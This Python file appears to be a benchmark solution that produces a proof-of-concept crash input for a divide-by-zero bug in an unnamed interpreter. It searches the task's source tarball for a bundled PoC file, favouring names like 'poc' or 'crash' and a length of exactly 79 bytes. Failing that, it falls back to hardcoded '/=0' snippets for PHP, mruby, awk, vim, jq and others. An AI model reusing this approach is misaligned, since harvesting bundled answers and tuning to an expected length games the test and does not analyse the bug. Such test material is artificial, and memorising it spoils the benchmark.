import os
import tarfile
import re

class Solution:
    def _iter_tar_files(self, src_path):
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if m.isfile() and m.size <= 1_000_000:
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                            yield m.name, data
                        except Exception:
                            continue
        except Exception:
            return

    def _score_candidate(self, name: str, data: bytes) -> int:
        score = 0
        lname = name.lower()
        text = data

        # Prefer likely PoC filenames
        poc_keywords = [
            "poc", "repro", "reproducer", "payload", "crash", "testcase",
            "trigger", "uaf", "minimized", "divide", "division", "zero", "byzero"
        ]
        for kw in poc_keywords:
            if kw in lname:
                score += 300
                break

        # Prefer smallish textual files
        length = len(text)
        if length == 79:
            score += 500
        else:
            score += max(0, 200 - abs(length - 79))

        # Prefer ASCII-ish
        ascii_ratio = sum((32 <= b <= 126) or b in (9, 10, 13) for b in text) / max(1, length)
        score += int(200 * ascii_ratio)

        # Content heuristics
        try:
            s = text.decode("utf-8", errors="ignore")
        except Exception:
            s = ""
        if "/=" in s:
            score += 200
        if re.search(r"/=\s*0\b", s):
            score += 300
        if "divide" in s.lower() or "division" in s.lower():
            score += 100
        if "zero" in s.lower():
            score += 80

        # Penalize obvious source files
        bad_exts = (".c", ".h", ".cc", ".cpp", ".hpp", ".java", ".py", ".rs", ".go", ".m", ".mm")
        if lname.endswith(bad_exts):
            score -= 200

        # Prefer short lines count
        lines = s.count("\n")
        if 0 < lines < 10:
            score += 50

        return score

    def _find_embedded_poc(self, src_path: str) -> bytes | None:
        best = None
        best_score = -10**9
        for name, data in self._iter_tar_files(src_path):
            # Only consider relatively small
            if len(data) == 0 or len(data) > 4096:
                continue
            score = self._score_candidate(name, data)
            if score > best_score:
                best_score = score
                best = data
        return best

    def _project_hint(self, src_path: str) -> str:
        # Try to infer project name from tar contents
        names = []
        for name, _ in self._iter_tar_files(src_path):
            names.append(name.lower())
            if len(names) > 3000:
                break
        joined = "\n".join(names)
        # Common detectors
        if "php-src" in joined or "/zend/" in joined or "/sapi/cli/php" in joined:
            return "php"
        if "mruby" in joined and "/src/" in joined and "/include/mruby" in joined:
            return "mruby"
        if "gawk" in joined or "/awk.c" in joined or "mawk" in joined:
            return "awk"
        if "/bc/" in joined or "gnu-bc" in joined or "libbc" in joined:
            return "bc"
        if "quickjs" in joined:
            return "quickjs"
        if "jerryscript" in joined:
            return "jerryscript"
        if "mujs" in joined:
            return "mujs"
        if "/lua/" in joined or "lua-5." in joined:
            return "lua"
        if "/vim/" in joined or "src/ex_cmds" in joined or "src/eval.c" in joined:
            return "vim"
        if "wren" in joined and "/vm/" in joined:
            return "wren"
        if "yasl" in joined and "/src/" in joined:
            return "yasl"
        if "jq-" in joined or "/jq/" in joined:
            return "jq"
        return ""

    def _fallback_poc(self, project_hint: str) -> bytes:
        # Tailored minimal PoCs per project type
        if project_hint == "php":
            return b"<?php $x=1; $x/=0; echo \"done\\n\";"

        if project_hint == "mruby":
            return b"begin; x=1; x/=0; rescue; end"

        if project_hint == "awk":
            return b"BEGIN{x=1; x/=0}"

        if project_hint == "bc":
            return b"a=1; a/=0\n"

        if project_hint == "vim":
            # Ex commands, likely read as script
            return b"let x=1 | let x /= 0 | echo 'done'"

        if project_hint == "lua":
            return b"local x=1; x=x/0"

        if project_hint == "quickjs" or project_hint == "jerryscript" or project_hint == "mujs":
            # Even though JS doesn't error on 1/0, include compound assignment to match description
            return b"let x=1; x/=0;"

        if project_hint == "wren":
            return b"var x = 1; x = x / 0"

        if project_hint == "yasl":
            return b"var x = 1; x /= 0;"

        if project_hint == "jq":
            # jq program with reduce dividing by zero
            return b"def f: . as $x | $x /= 0; 1|f"

        # Generic fallback
        return b"a=1; a/=0"

    def solve(self, src_path: str) -> bytes:
        if src_path and os.path.exists(src_path):
            poc = self._find_embedded_poc(src_path)
            if poc:
                return poc
            hint = self._project_hint(src_path)
            return self._fallback_poc(hint)
        return b"a=1; a/=0"